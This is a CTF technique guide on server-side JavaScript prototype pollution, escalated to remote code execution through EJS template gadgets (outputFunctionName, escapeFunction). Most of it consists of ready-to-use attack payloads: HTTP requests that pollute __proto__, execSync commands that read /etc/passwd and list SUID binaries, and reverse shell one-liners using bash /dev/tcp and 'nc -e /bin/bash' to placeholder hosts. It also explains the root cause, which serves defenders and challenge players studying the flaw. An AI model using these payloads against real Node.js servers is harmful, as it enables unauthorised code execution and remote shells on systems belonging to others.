# Prototype Pollution

## Table of Contents
- [Prototype Pollution](#prototype-pollution)
  - [Table of Contents](#table-of-contents)
  - [Overview](#overview)
    - [Root Cause](#root-cause)
  - [Quick Reference](#quick-reference)
  - [Techniques](#techniques)
    - [Identifying the Vulnerability](#identifying-the-vulnerability)
      - [Red Flags in Source Code](#red-flags-in-source-code)
    - [Confirming Prototype Pollution](#confirming-prototype-pollution)
    - [Escalating to RCE via EJS Gadget](#escalating-to-rce-via-ejs-gadget)
      - [How EJS uses `outputFunctionName`](#how-ejs-uses-outputfunctionname)
      - [Confirming the Template Engine](#confirming-the-template-engine)
      - [RCE POC — Command Output in Response](#rce-poc--command-output-in-response)
      - [RCE — Reverse Shell](#rce--reverse-shell)
    - [Alternative EJS Gadget — `escapeFunction`](#alternative-ejs-gadget--escapefunction)
    - [Staging with `debug` and `client`](#staging-with-debug-and-client)
  - [Files](#files)
  - [References](#references)
    - [Labs](#labs)
    - [Challenges](#challenges)
    - [Web Sites](#web-sites)

---

## Overview

Prototype pollution is a JavaScript vulnerability that allows an attacker to inject properties into `Object.prototype`, the root prototype shared by all JavaScript objects. Because every object inherits from `Object.prototype`, a polluted property becomes visible on every object in the process, including ones the attacker never directly touched.

In server-side Node.js applications, this vulnerability can be escalated to Remote Code Execution (RCE) by targeting properties used by template engines or other code-execution sinks.

### Root Cause
An application allows user-controlled input to set arbitrary keys on a server-side object without sanitizing for `__proto__` or `constructor`:
```js
// Vulnerable pattern — no key sanitization
obj[key][subkey] = value;

// If key = "__proto__" and subkey = "polluted", then:
// Object.prototype.polluted = value
// → every object now has .polluted = value
```

---

## Quick Reference

| Step | Payload Pattern | Goal |
|---|---|---|
| Probe | `key=__proto__`, `subkey=toString`, `value=bad` | Confirm pollution crashes the app |
| Identify engine | `subkey=escapeFn` → check error for `ejs` | Confirm EJS is the template engine |
| RCE (sync) | `subkey=outputFunctionName`, `value=_tmp;return require('child_process').execSync('id').toString();//` | Execute command, output in HTTP response |
| RCE (async shell) | `subkey=outputFunctionName`, `value=_tmp;require('child_process').exec('bash -c "bash -i >& /dev/tcp/HOST/PORT 0>&1"');return '';//` | Reverse shell |

---

## Techniques

### Identifying the Vulnerability

Look for endpoints that accept a JSON payload and use it to update properties on a server-side object. Common patterns:

```http
GET /ctrlsignals?message={"action":"update","key":"settings","subkey":"name","value":"test"}
```

If the server does something like:
```js
obj[key][subkey] = value;
```

without validating that `key` is not `__proto__` or `constructor`, the endpoint is vulnerable.

#### Red Flags in Source Code
- Bracket notation assignment with user-controlled keys: `obj[key][subkey] = value`.
- No allowlist of valid key names.
- No call to `Object.hasOwn()` or similar guard.

### Confirming Prototype Pollution

Pollute a built-in method that will be called on the next request and verify the application breaks:

```http
GET /endpoint?message={"action":"update","key":"__proto__","subkey":"toString","value":"NothingGood"}
```

If the next page load throws a `TypeError` like:
```
TypeError: Object.prototype.toString.call is not a function
```
then Prototype Pollution is confirmed. The application replaced the real `toString` function with a string, so any code that calls `.toString()` on an object now fails.

### Escalating to RCE via EJS Gadget

EJS (Embedded JavaScript) is a common Node.js templating engine. When EJS compiles a template, it generates a function that references an internal variable called `outputFunctionName`. If that property has been polluted on `Object.prototype`, EJS will use the attacker's value directly in the compiled function body; hence, enabling code injection.

#### How EJS uses `outputFunctionName`
EJS internally generates something like:
```js
function anonymous(locals) {
  var __output = "";
  var outputFunctionName = <value from Object.prototype>;
  // ... template rendering
}
```

If the value assigned to `outputFunctionName` is set to an attacker-controlled string, then the compiled function will include that string as-is.

For example, if the value is set to:
```js
_tmp;require('child_process').execSync('id').toString();//
```
then, then compialed function becomes:
```js
var outputFunctionName = _tmp;require('child_process').execSync('id').toString();//
```

In this example, the `;` ends the assignment, the arbitrary payload executes, and `//` comments out the rest.

#### Confirming the Template Engine

Pollute a property that EJS specifically reads and check the error message:

```http
GET /endpoint?message={"action":"update","key":"__proto__","subkey":"escapeFn","value":"not-a-function"}
```

If the stack trace references EJS paths like `/app/node_modules/ejs/lib/ejs.js`, the template engine is confirmed:
```log
TypeError: /app/views/stats.ejs:70
    escapeFn is not a function
    at eval (/app/views/stats.ejs:15:16)
    at stats (/app/node_modules/ejs/lib/ejs.js:691:17)
```

#### RCE POC — Command Output in Response

Use `execSync` (synchronous) so the output is returned before the HTTP response is sent:

```http
GET /endpoint?message={"action":"update","key":"__proto__","subkey":"outputFunctionName","value":"_tmp;return global.process.mainModule.require('child_process').execSync('id').toString();//"}
```

Then trigger template rendering by visitng a page that loads the template results, e.g., a stats page:
```
GET /stats
```

The page body will contain the command output instead of rendered HTML:
```
uid=0(root) gid=0(root) groups=0(root)
```

Other useful `execSync` payloads:
- List directory:
  ```js
  _tmp;return global.process.mainModule.require('child_process').execSync('ls /app').toString();//
  ```
- Read a file:
  ```js
  _tmp;return global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString();//
  ```
- Find SUID binaries
  ```js
  _tmp;return global.process.mainModule.require('child_process').execSync('find / -perm -4000 2>/dev/null').toString();//
  ```

#### RCE — Reverse Shell

Use `exec` (asynchronous) for a reverse shell since the connection is persistent and `execSync` would block indefinitely:

```http
GET /endpoint?message={"action":"update","key":"__proto__","subkey":"outputFunctionName","value":"_tmp;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/NGROK_HOST/PORT 0>&1\"');return '';//"}
```

Then trigger rendering:
```
GET /stats
```

The page will not load (connection hijacked), but the reverse shell listener receives a connection. See [`ctf-techniques/network/tunneling/`](../../network/tunneling/README.md) for Ngrok tunnel and shell upgrade steps.

### Alternative EJS Gadget — `escapeFunction`

A second EJS gadget targets the `escapeFunction` / `escapeXML` property. This can be used when `outputFunctionName` is patched or unavailable:

```http
GET /endpoint?message={"action":"update","key":"__proto__","subkey":"escapeFunction","value":"JSON.stringify; process.mainModule.require('child_process').exec('nc -e /bin/bash HOST PORT;sleep 10000000')"}
```

The `JSON.stringify` prefix ensures the value passes any initial type checks. The `exec` call runs asynchronously.

### Staging with `debug` and `client`

Some EJS gadget chains require staging before the main payload. Setting `debug` and `client` flags on `Object.prototype` forces EJS into client-side compilation mode, which may expose more attack surface:

- Stage debug flag:
  ```js
  {"action":"update","key":"__proto__","subkey":"debug","value":1}
  ```
- Stage client flag:
  ```js
  {"action":"update","key":"__proto__","subkey":"client","value":1}
  ```

These are sent before the main weaponization payload.

---

## Files

| File | Description | Source |
|---|---|---|
| `set-reverse-shell.py` | Automated exploit script: login, stage, weaponize, trigger | HHC 2025 Act III - Hack-a-Gnome |

---

## References


### Labs
| Source | Name |
|---|---|
| N/A | N/A |

### Challenges
| Source | Name |
|---|---|
| Holiday Hack Challenge 2025, Act III | [Hack-a-Gnome](../../../ctf-writeups/holiday-hack-challenge/2025/act-iii/hack-a-gnome/README.md) |

### Web Sites
- [`ctf-techniques/network/tunneling/`](../../network/tunneling/README.md) — Ngrok tunnel and reverse shell setup
- [PortSwigger: Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger: Server-Side Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/server-side)
- [HackTricks: Prototype Pollution to RCE](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution)
